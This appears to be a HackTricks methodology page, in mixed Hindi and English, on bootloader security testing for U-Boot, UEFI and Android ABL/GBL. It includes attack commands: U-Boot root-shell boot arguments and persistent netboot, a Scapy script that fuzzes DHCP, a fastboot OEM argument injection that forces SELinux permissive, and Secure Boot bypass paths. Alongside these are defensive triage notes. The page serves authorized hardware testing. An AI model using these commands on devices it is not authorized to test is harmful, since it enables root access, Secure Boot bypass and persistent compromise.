# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

निम्नलिखित steps device startup configurations को modify करने और U-Boot तथा UEFI-class loaders जैसे bootloaders की testing के लिए recommended हैं। Early code execution प्राप्त करने, signature/rollback protections का assessment करने और recovery या network-boot paths का abuse करने पर focus करें।

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Interpreter shell access करें
- Boot के दौरान, `bootcmd` के execute होने से पहले किसी known break key (अक्सर कोई भी key, 0, space या board-specific "magic" sequence) को दबाकर U-Boot prompt पर जाएं।<sup>[[1]](#references)</sup>

2. Boot state और variables inspect करें
- Useful commands:
- `printenv` (environment dump करें)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Root shell प्राप्त करने के लिए boot arguments modify करें
- `init=/bin/sh` append करें, ताकि kernel normal init के बजाय shell पर drop हो:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. अपने TFTP server से Netboot करें
- Network configure करें और LAN से kernel/fit image fetch करें:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Environment के माध्यम से changes persist करें
- यदि env storage write-protected नहीं है, तो आप control persist कर सकते हैं:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे variables की जांच करें, जो fallback paths को influence करते हैं। Misconfigured values shell में repeated breaks की अनुमति दे सकती हैं।

6. Debug/unsafe features check करें
- इन features को खोजें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के माध्यम से `loady`/`loads` करने की ability, untrusted media से `env import`, और signature checks के बिना loaded kernels/ramdisks।

7. U-Boot image/verification testing
- यदि platform FIT images के साथ secure/verified boot का claim करता है, तो unsigned और tampered दोनों images try करें:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` का absence या legacy `verify=n` behavior अक्सर arbitrary payloads को boot करने की अनुमति देता है।
- केवल simple allow/deny result पर न रुकें: हालिया FIT research ने दिखाया है कि verification path स्वयं pre-auth attack surface हो सकता है। Externally stored FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables` और overlay / `extra-conf` handling पर negative-test करें।
- यदि आपके पास matching source tree है, तो real hardware को touch करने से पहले U-Boot sandbox में FIT verification behaviour reproduce करने के लिए `test/vboot/vboot_test.sh` एक fast तरीका है।<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` और script bootflows
- Modern U-Boot builds में `bootcmd` अक्सर Standard Boot के wrapper के रूप में होता है। इसका अर्थ है कि writable media, PXE या SPI flash वास्तविक trust boundary बन सकते हैं, भले ही visible environment harmless दिखाई दे।
- `extlinux` bootmeth `/` और `/boot` के अंतर्गत `extlinux/extlinux.conf` खोजता है; script bootmeth पहले `boot.scr.uimg` और फिर `boot.scr` खोजता है। Network boot पर script filename `boot_script_dhcp` से आ सकता है।
- Useful triage commands:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Test किए जाने वाले abuse cases: `boot_targets` में attacker-controlled USB/SD media का पहले होना, writable `/boot/extlinux/extlinux.conf`, rogue TFTP द्वारा `boot.scr` supply करना या `script_offset_f` के माध्यम से SPI-backed script execution।
- यदि platform FIT verification पर निर्भर है, तो सुनिश्चित करें कि configurations configuration level पर signed हों, केवल per-image नहीं; `required-mode=all`, किसी एक required key को accept करने से stronger है।

## Network-boot surface (DHCP/PXE) और rogue servers

9. PXE/DHCP parameter fuzzing
- U-Boot के legacy BOOTP/DHCP handling में memory-safety issues रहे हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के माध्यम से memory disclosure को describe करता है, जिससे U-Boot memory के bytes wire पर वापस leak हो सकते हैं।<sup>[[4]](#references)</sup> DHCP/PXE code paths को overly long/edge-case values (option 67 bootfile-name, vendor options, file/servername fields) के साथ exercise करें और hangs/leaks observe करें।
- Netboot के दौरान boot parameters को stress करने के लिए minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- यह भी validate करें कि OS-side provisioning scripts से chain होने पर PXE filename fields बिना sanitization के shell/loader logic में pass तो नहीं किए जा रहे।

10. Rogue DHCP server command injection testing
- एक rogue DHCP/PXE service setup करें और filename या options fields में characters inject करने का प्रयास करें, ताकि boot chain के बाद के stages में command interpreters तक पहुंचा जा सके। Metasploit का DHCP auxiliary, `dnsmasq` या custom Scapy scripts अच्छी तरह काम करते हैं। पहले lab network को isolate करना सुनिश्चित करें।

## SoC ROM recovery modes जो normal boot को override करते हैं

कई SoCs एक BootROM "loader" mode expose करते हैं, जो flash images invalid होने पर भी USB/UART के माध्यम से code accept करता है। यदि secure-boot fuses blown नहीं हैं, तो यह chain में बहुत early arbitrary code execution provide कर सकता है।

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) या `imx-usb-loader`।
- Example: `imx-usb-loader u-boot.imx` से RAM में custom U-Boot push और run करें।
- Allwinner (FEL)
- Tool: `sunxi-fel`।
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`।
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`।
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` से loader stage करें और custom U-Boot upload करें।

Assess करें कि device में secure-boot eFuses/OTP burned हैं या नहीं। यदि नहीं हैं, तो BootROM download modes अक्सर U-Boot, kernel और rootfs की किसी भी higher-level verification को bypass कर देते हैं, क्योंकि वे आपके first-stage payload को सीधे SRAM/DRAM से execute करते हैं।

## UEFI/PC-class bootloaders: quick checks

11. ESP tampering, rollback और key-enrollment testing
- EFI System Partition (ESP) mount करें और loader components की जांच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
- जब संभव हो, OS से Secure Boot state और key databases dump करें:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- यदि platform Setup Mode में है, unauthenticated key enrollment स्वीकार करता है या test/default Platform Key (PKfail class) के साथ ship होता है, तो local admin या physical attacker अपना KEK/db enroll कर सकता है और arbitrary EFI binaries boot करते समय Secure Boot को “enabled” दिखा सकता है।<sup>[[3]](#references)</sup>
- यदि Secure Boot revocations (dbx) current नहीं हैं, तो downgraded या known-vulnerable signed boot components से boot करने का प्रयास करें। यदि platform अभी भी पुराने shims/bootmanagers पर trust करता है, तो persistence प्राप्त करने के लिए अक्सर ESP से अपना kernel या `grub.cfg` load किया जा सकता है।

12. Stale shim / SBAT / dbx revocation testing
- पुराने Microsoft-signed shims और vendor forks stale revocations होने पर BYOVD-style bootkit path के रूप में कार्य कर सकते हैं। Isolated lab में ESP पर historically vulnerable shim रखें और अपने `grubx64.efi` या kernel को chainload करने का प्रयास करें।<sup>[[11]](#references)</sup>
- Quick triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- यदि shim revocation list पर होने के बावजूद run करता है, तो firmware/OS में stale `dbx` updates हैं या वह ऐसे forked loader पर trust करता है जिसने upstream SBAT protections कभी inherit नहीं कीं।

13. Boot logo parsing bugs (LogoFAIL class)
- कई OEM/IBV firmwares DXE में image-parsing flaws के प्रति vulnerable थे, जो boot logos process करते हैं। यदि attacker vendor-specific path (जैसे `\EFI\<vendor>\logo\*.bmp`) के अंतर्गत ESP पर crafted image रख सकता है और reboot कर सकता है, तो Secure Boot enabled होने पर भी early boot के दौरान code execution संभव हो सकता है। Test करें कि platform user-supplied logos स्वीकार करता है या नहीं और क्या वे paths OS से writable हैं।<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Android 16 devices पर, जो Qualcomm के ABL का उपयोग करके **Generic Bootloader Library (GBL)** load करते हैं, validate करें कि ABL `efisp` partition से load किए गए UEFI app को **authenticate** करता है या नहीं। यदि ABL केवल UEFI app की **presence** check करता है और signatures verify नहीं करता, तो `efisp` में write primitive boot के समय **pre-OS unsigned code execution** में बदल जाता है।<sup>[[6]](#references)[[7]](#references)</sup>

Practical checks और abuse paths:

- **efisp write primitive**: `efisp` में custom UEFI app लिखने के लिए आपको कोई तरीका चाहिए (root/privileged service, OEM app bug, recovery/fastboot path)। इसके बिना GBL loading gap सीधे reachable नहीं है।<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): कुछ builds `fastboot oem set-gpu-preemption` में extra tokens accept करते हैं और उन्हें kernel cmdline में append करते हैं। इसका उपयोग permissive SELinux force करने के लिए किया जा सकता है, जिससे protected partition writes enable होते हैं:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
यदि device patched है, तो command को extra arguments reject करने चाहिए।<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock via persistent flags**: boot-stage payload persistent unlock flags (जैसे `is_unlocked=1`, `is_unlocked_critical=1`) flip कर सकता है, जिससे OEM server/approval gates के बिना `fastboot oem unlock` emulate किया जा सके। अगले reboot के बाद यह एक durable posture change है।<sup>[[6]](#references)</sup>

Defensive/triage notes:

- Confirm करें कि ABL `efisp` से आने वाले GBL/UEFI payload पर signature verification करता है या नहीं। यदि नहीं, तो `efisp` को high-risk persistence surface मानें।
- Track करें कि ABL fastboot OEM handlers **argument counts validate** करने और additional tokens reject करने के लिए patched हैं या नहीं।<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware caution

Early boot के दौरान SPI/NAND flash के साथ interact करते समय (जैसे reads bypass करने के लिए pins को ground करना) सावधान रहें और हमेशा flash datasheet consult करें। गलत समय पर किए गए shorts device या programmer को corrupt कर सकते हैं।

## Notes and additional tips

- Environment blobs को RAM और storage के बीच move करने के लिए `env export -t ${loadaddr}` और `env import -t ${loadaddr}` try करें; कुछ platforms removable media से authentication के बिना env import करने की अनुमति देते हैं।
- Linux-based systems पर persistence के लिए, जो `extlinux.conf` के माध्यम से boot होते हैं, boot partition में `APPEND` line modify करना (जब कोई signature checks enforced न हो, तब `init=/bin/sh` या `rd.break` inject करने के लिए) अक्सर पर्याप्त होता है।
- यदि target dual-slot / A/B updates का उपयोग करता है, तो [firmware analysis overview](README.md) में anti-rollback और slot-desync techniques review करें, ताकि bootloader के बाहर updater-only trust gaps छूट न जाएं।
- यदि userland `fw_printenv/fw_setenv` provide करता है, तो validate करें कि `/etc/fw_env.config` वास्तविक env storage से match करता है। Misconfigured offsets आपको गलत MTD region read/write करने देते हैं।

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
